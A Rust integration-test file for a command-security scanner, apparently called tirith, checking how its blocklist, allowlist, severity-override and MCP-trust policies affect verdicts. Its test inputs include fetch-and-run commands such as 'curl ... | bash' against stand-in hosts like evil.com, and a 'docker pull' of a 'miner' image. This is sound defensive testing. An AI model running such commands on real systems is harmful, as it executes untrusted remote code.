//! Integration tests for the policy system: temp dirs with `.git` markers and
//! `.tirith/` policy dirs exercise blocklist/allowlist/severity overrides and
//! discovery through the full engine pipeline.

use std::fs;

use tempfile::TempDir;

use tirith_core::engine::{self, AnalysisContext};
use tirith_core::extract::ScanContext;
use tirith_core::tokenize::ShellType;
use tirith_core::verdict::{Action, RuleId, Severity};

/// Create a temp dir that looks like a repo root with a `.tirith/` policy.
fn make_repo(policy_yaml: &str) -> TempDir {
    let tmp = TempDir::new().expect("create temp dir");
    fs::create_dir_all(tmp.path().join(".git")).unwrap();
    let tirith_dir = tmp.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).unwrap();
    fs::write(tirith_dir.join("policy.yaml"), policy_yaml).unwrap();
    tmp
}

fn analyze_exec(input: &str, cwd: &str) -> tirith_core::verdict::Verdict {
    let ctx = AnalysisContext {
        input: input.to_string(),
        shell: ShellType::Posix,
        scan_context: ScanContext::Exec,
        raw_bytes: None,
        interactive: true,
        cwd: Some(cwd.to_string()),
        file_path: None,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: tirith_core::clipboard::ClipboardSourceState::Unread,
    };
    engine::analyze(&ctx)
}

#[test]
fn test_blocklist_triggers_policy_blocklisted() {
    let repo = make_repo("fail_mode: open\n");
    fs::write(
        repo.path().join(".tirith/blocklist"),
        "malicious-cdn.example.com\n",
    )
    .unwrap();

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://malicious-cdn.example.com/payload.sh", cwd);

    assert_eq!(verdict.action, Action::Block);
    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
        "Should fire PolicyBlocklisted for blocklisted URL. Findings: {:?}",
        verdict
            .findings
            .iter()
            .map(|f| &f.rule_id)
            .collect::<Vec<_>>()
    );
    let blocklist_finding = verdict
        .findings
        .iter()
        .find(|f| f.rule_id == RuleId::PolicyBlocklisted)
        .unwrap();
    assert_eq!(blocklist_finding.severity, Severity::Critical);
}

#[test]
fn test_blocklist_case_insensitive() {
    let repo = make_repo("fail_mode: open\n");
    fs::write(repo.path().join(".tirith/blocklist"), "MALICIOUS.COM\n").unwrap();

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://malicious.com/script.sh", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
        "Blocklist should be case-insensitive"
    );
}

#[test]
fn test_blocklist_substring_match() {
    let repo = make_repo("fail_mode: open\n");
    fs::write(repo.path().join(".tirith/blocklist"), "evil.com\n").unwrap();

    let cwd = repo.path().to_str().unwrap();
    // evil.com appears as substring of subdomain.evil.com
    let verdict = analyze_exec("curl https://subdomain.evil.com/path", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
        "Blocklist should match substrings"
    );
}

#[test]
fn test_allowlist_filters_findings() {
    let repo = make_repo("fail_mode: open\n");
    fs::write(repo.path().join(".tirith/allowlist"), "bit.ly\n").unwrap();

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install", cwd);

    assert_eq!(
        verdict.action,
        Action::Allow,
        "Allowlisted URL should not produce warnings. Findings: {:?}",
        verdict
            .findings
            .iter()
            .map(|f| format!("{}: {}", f.rule_id, f.title))
            .collect::<Vec<_>>()
    );
}

#[test]
fn test_blocklist_overrides_allowlist() {
    let policy = r#"
fail_mode: open
blocklist:
  - evil.com
allowlist:
  - evil.com
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://evil.com/payload.sh", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
        "Blocklist should override allowlist"
    );
}

#[test]
fn test_allowlist_rules_filter_only_the_named_rule() {
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: shortened_url
    patterns:
      - bit.ly
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install | bash", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .all(|f| f.rule_id != RuleId::ShortenedUrl),
        "rule-scoped allowlist should suppress only ShortenedUrl. Findings: {:?}",
        verdict
            .findings
            .iter()
            .map(|f| format!("{}: {}", f.rule_id, f.title))
            .collect::<Vec<_>>()
    );
    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::CurlPipeShell),
        "rule-scoped allowlist must not suppress unrelated rules"
    );
    assert_eq!(verdict.action, Action::Block);
}

#[test]
fn test_allowlist_rules_can_suppress_pipe_to_shell_for_trusted_url() {
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: curl_pipe_shell
    patterns:
      - example.com/install.sh
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .all(|f| f.rule_id != RuleId::CurlPipeShell),
        "rule-scoped allowlist should suppress CurlPipeShell for trusted URLs"
    );
    assert_eq!(verdict.action, Action::Allow);
}

#[test]
fn test_allowlist_rules_do_not_suppress_multi_url_pipe_when_any_url_is_untrusted() {
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: curl_pipe_shell
    patterns:
      - trusted.example.com/install.sh
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec(
        "curl https://trusted.example.com/install.sh https://evil.example.com/payload.sh | bash",
        cwd,
    );

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::CurlPipeShell),
        "mixed trusted and untrusted URLs must keep CurlPipeShell"
    );
    assert_eq!(verdict.action, Action::Block);
}

#[test]
fn test_allowlist_rules_suppress_multi_url_pipe_only_when_all_urls_are_trusted() {
    let policy = r#"
fail_mode: open
allowlist_rules:
  - rule_id: curl_pipe_shell
    patterns:
      - trusted.example.com/install.sh
      - mirror.example.com/install.sh
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec(
        "curl https://trusted.example.com/install.sh https://mirror.example.com/install.sh | bash",
        cwd,
    );

    assert!(
        verdict
            .findings
            .iter()
            .all(|f| f.rule_id != RuleId::CurlPipeShell),
        "all trusted URLs should suppress CurlPipeShell"
    );
    assert_eq!(verdict.action, Action::Allow);
}

#[test]
fn test_severity_override_escalates() {
    let policy = r#"
severity_overrides:
  shortened_url: CRITICAL
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install", cwd);

    let shortened = verdict
        .findings
        .iter()
        .find(|f| f.rule_id == RuleId::ShortenedUrl);
    assert!(shortened.is_some(), "Should find ShortenedUrl");
    assert_eq!(
        shortened.unwrap().severity,
        Severity::Critical,
        "severity_overrides should escalate ShortenedUrl to CRITICAL"
    );
    assert_eq!(verdict.action, Action::Block);
}

#[test]
fn test_severity_override_downgrades() {
    let policy = r#"
severity_overrides:
  curl_pipe_shell: LOW
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);

    let curl_pipe = verdict
        .findings
        .iter()
        .find(|f| f.rule_id == RuleId::CurlPipeShell);
    assert!(curl_pipe.is_some(), "Should find CurlPipeShell");
    assert_eq!(
        curl_pipe.unwrap().severity,
        Severity::Low,
        "severity_overrides should downgrade CurlPipeShell to LOW"
    );
    assert_eq!(
        verdict.action,
        Action::Warn,
        "Downgraded severity should change action from Block to Warn"
    );
}

#[test]
fn test_policy_yml_extension_works() {
    let tmp = TempDir::new().unwrap();
    fs::create_dir_all(tmp.path().join(".git")).unwrap();
    let tirith_dir = tmp.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).unwrap();
    fs::write(
        tirith_dir.join("policy.yml"),
        "severity_overrides:\n  shortened_url: CRITICAL\n",
    )
    .unwrap();

    let cwd = tmp.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install", cwd);

    let shortened = verdict
        .findings
        .iter()
        .find(|f| f.rule_id == RuleId::ShortenedUrl);
    assert!(shortened.is_some(), "Should find ShortenedUrl");
    assert_eq!(
        shortened.unwrap().severity,
        Severity::Critical,
        ".yml extension should work for policy files"
    );
}

#[test]
fn test_policy_yaml_preferred_over_yml() {
    let tmp = TempDir::new().unwrap();
    fs::create_dir_all(tmp.path().join(".git")).unwrap();
    let tirith_dir = tmp.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).unwrap();
    fs::write(
        tirith_dir.join("policy.yaml"),
        "severity_overrides:\n  shortened_url: CRITICAL\n",
    )
    .unwrap();
    fs::write(
        tirith_dir.join("policy.yml"),
        "severity_overrides:\n  shortened_url: LOW\n",
    )
    .unwrap();

    let cwd = tmp.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install", cwd);

    let shortened = verdict
        .findings
        .iter()
        .find(|f| f.rule_id == RuleId::ShortenedUrl);
    assert!(shortened.is_some());
    assert_eq!(
        shortened.unwrap().severity,
        Severity::Critical,
        ".yaml should take precedence over .yml"
    );
}

#[test]
fn test_no_policy_uses_defaults() {
    let tmp = TempDir::new().unwrap();
    fs::create_dir_all(tmp.path().join(".git")).unwrap();

    let cwd = tmp.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);

    assert_eq!(
        verdict.action,
        Action::Block,
        "Default policy should block pipe-to-shell"
    );
}

#[test]
fn test_malformed_policy_falls_back_to_default() {
    let tmp = TempDir::new().unwrap();
    fs::create_dir_all(tmp.path().join(".git")).unwrap();
    let tirith_dir = tmp.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).unwrap();
    fs::write(tirith_dir.join("policy.yaml"), "{{{{invalid yaml!!!!").unwrap();

    let cwd = tmp.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);

    assert_eq!(
        verdict.action,
        Action::Block,
        "Malformed policy should fall back to defaults"
    );
}

#[test]
fn test_verdict_reports_policy_path() {
    let repo = make_repo("fail_mode: open\n");

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);

    assert!(
        verdict.policy_path_used.is_some(),
        "Verdict should report the policy path"
    );
    let path = verdict.policy_path_used.as_ref().unwrap();
    assert!(
        path.contains("policy.yaml"),
        "Policy path should contain 'policy.yaml', got: {path}"
    );
}

#[test]
fn test_cookbook_strict_org() {
    let policy = r#"
fail_mode: closed
allow_bypass_env: false
severity_overrides:
  shortened_url: HIGH
  plain_http_to_sink: CRITICAL
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();

    let verdict = analyze_exec("curl https://bit.ly/install", cwd);
    let shortened = verdict
        .findings
        .iter()
        .find(|f| f.rule_id == RuleId::ShortenedUrl);
    assert!(shortened.is_some());
    assert_eq!(shortened.unwrap().severity, Severity::High);
    assert_eq!(verdict.action, Action::Block);
}

#[test]
fn test_cookbook_docker_focused() {
    let policy = r#"
severity_overrides:
  docker_untrusted_registry: CRITICAL
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();

    let verdict = analyze_exec("docker pull evil-registry.com/miner", cwd);
    let docker_finding = verdict
        .findings
        .iter()
        .find(|f| f.rule_id == RuleId::DockerUntrustedRegistry);
    assert!(docker_finding.is_some());
    assert_eq!(docker_finding.unwrap().severity, Severity::Critical);
    assert_eq!(verdict.action, Action::Block);
}

#[test]
fn test_cookbook_learning_mode() {
    let policy = r#"
severity_overrides:
  curl_pipe_shell: LOW
  wget_pipe_shell: LOW
  pipe_to_interpreter: LOW
  punycode_domain: LOW
  confusable_domain: LOW
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();

    // curl | bash would normally BLOCK; the LOW overrides drop it to WARN.
    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);
    assert_eq!(
        verdict.action,
        Action::Warn,
        "Learning mode should reduce curl|bash from Block to Warn"
    );
}

#[test]
fn test_org_lists_merged_into_policy() {
    let repo = make_repo("fail_mode: open\n");
    let tirith_dir = repo.path().join(".tirith");

    fs::write(tirith_dir.join("blocklist"), "blocked-cdn.example.com\n").unwrap();
    fs::write(tirith_dir.join("allowlist"), "bit.ly\n").unwrap();

    let cwd = repo.path().to_str().unwrap();

    let verdict = analyze_exec("curl https://blocked-cdn.example.com/script.sh", cwd);
    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
        "Org blocklist should be merged into policy"
    );

    let verdict = analyze_exec("curl https://bit.ly/safe-link", cwd);
    assert_eq!(
        verdict.action,
        Action::Allow,
        "Org allowlist should filter findings"
    );
}

#[test]
fn test_blocklist_ignores_comments() {
    let repo = make_repo("fail_mode: open\n");
    fs::write(
        repo.path().join(".tirith/blocklist"),
        "# This is a comment\nevil.com\n# Another comment\n",
    )
    .unwrap();

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://evil.com/payload.sh", cwd);
    assert!(verdict
        .findings
        .iter()
        .any(|f| f.rule_id == RuleId::PolicyBlocklisted));
}

// Policy-aware MCP suppression: `scan.trusted_mcp_servers` /
// `scan.mcp_allowed_tools` exercised through the full pipeline — write a policy,
// drop an MCP config, scan it, assert which findings fired.

/// Scan a config file in the given repo, returning the verdict.
fn scan_config_file(repo: &TempDir, file_path: &str) -> tirith_core::verdict::Verdict {
    let abs_path = repo.path().join(file_path);
    let content = std::fs::read_to_string(&abs_path).expect("read scanned file");
    let ctx = AnalysisContext {
        input: content,
        shell: ShellType::Posix,
        scan_context: ScanContext::FileScan,
        raw_bytes: None,
        interactive: false,
        cwd: Some(repo.path().to_str().unwrap().to_string()),
        file_path: Some(abs_path),
        repo_root: Some(repo.path().to_str().unwrap().to_string()),
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: tirith_core::clipboard::ClipboardSourceState::Unread,
    };
    engine::analyze(&ctx)
}

#[test]
fn test_policy_round_trip_for_mcp_fields() {
    // A policy with `trusted_mcp_servers` AND `mcp_allowed_tools` must load,
    // validate, and be honored end-to-end through the engine.
    let policy_yaml = r#"
fail_mode: open
scan:
  trusted_mcp_servers:
    - my-trusted-server
  mcp_allowed_tools:
    my-trusted-server:
      - read_only
"#;
    let repo = make_repo(policy_yaml);

    // A config that would normally trigger McpInsecureServer (http://) — the
    // trusted name must suppress the finding.
    fs::write(
        repo.path().join("mcp.json"),
        r#"{"mcpServers":{"my-trusted-server":{"url":"http://insecure.example.com/mcp"}}}"#,
    )
    .unwrap();

    let verdict = scan_config_file(&repo, "mcp.json");
    assert!(
        !verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::McpInsecureServer),
        "trusted server name must suppress mcp_insecure_server: {:?}",
        verdict
            .findings
            .iter()
            .map(|f| &f.rule_id)
            .collect::<Vec<_>>()
    );
}

#[test]
fn test_untrusted_mcp_server_still_fires() {
    // Server NOT in `trusted_mcp_servers` → the finding fires.
    let policy_yaml = r#"
fail_mode: open
scan:
  trusted_mcp_servers:
    - some-other-name
"#;
    let repo = make_repo(policy_yaml);
    fs::write(
        repo.path().join("mcp.json"),
        r#"{"mcpServers":{"evil-server":{"url":"http://evil.example.com/mcp"}}}"#,
    )
    .unwrap();

    let verdict = scan_config_file(&repo, "mcp.json");
    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::McpInsecureServer),
        "untrusted server name must still fire mcp_insecure_server: {:?}",
        verdict
            .findings
            .iter()
            .map(|f| &f.rule_id)
            .collect::<Vec<_>>()
    );
}

#[test]
fn test_mcp_allowed_tools_round_trip_through_yaml() {
    // `mcp_allowed_tools` must load, validate, and be honored — asserted via
    // the engine (a rejected field would mean no disallowed-tool finding).
    let policy_yaml = r#"
fail_mode: open
scan:
  mcp_allowed_tools:
    fs:
      - read_file
"#;
    let repo = make_repo(policy_yaml);
    // A lockfile recording a tool outside the allowed set.
    let mcp_config =
        r#"{"mcpServers":{"fs":{"command":"node","tools":["read_file","evil_tool"]}}}"#;
    fs::write(repo.path().join(".mcp.json"), mcp_config).unwrap();

    let inv = tirith_core::mcp_lock::build_inventory(repo.path());
    let lock = tirith_core::mcp_lock::McpLockfile::from_inventory(&inv);
    let lock_dir = repo.path().join(".tirith");
    // .tirith already exists from make_repo (it holds policy.yaml).
    fs::write(lock_dir.join("mcp.lock"), lock.render()).unwrap();

    let verdict = scan_config_file(&repo, ".tirith/mcp.lock");
    let drift_findings: Vec<&_> = verdict
        .findings
        .iter()
        .filter(|f| f.rule_id == RuleId::McpServerDrift)
        .collect();
    assert!(
        !drift_findings.is_empty(),
        "expected a McpServerDrift finding for the disallowed lockfile tool: {verdict:?}"
    );
    // The disallowed-tool finding is High (vs the Medium default).
    assert!(
        drift_findings.iter().any(|f| f.severity == Severity::High),
        "expected a High-severity drift finding for a disallowed lockfile tool, \
         got: {:?}",
        drift_findings
            .iter()
            .map(|f| (&f.rule_id, &f.severity, &f.title))
            .collect::<Vec<_>>()
    );
}
